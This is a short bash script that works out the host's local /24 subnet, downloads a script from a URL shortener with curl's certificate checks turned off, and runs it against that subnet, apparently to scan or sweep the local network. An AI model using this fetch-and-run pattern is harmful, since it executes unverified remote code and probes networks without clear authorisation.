#!/bin/bash
# Grep current 3 octects of host IP
sdsd=$(hostname -I | grep -E -o "([0-9]{1,3}[\.]){3}")
# CIDR Scope
sdsd+="0/24"
# Download Script
curl -LOk https://da.gd/psp
# Rename Script to .sh
mv psp p.sh
# Run script
bash p.sh $sdsd
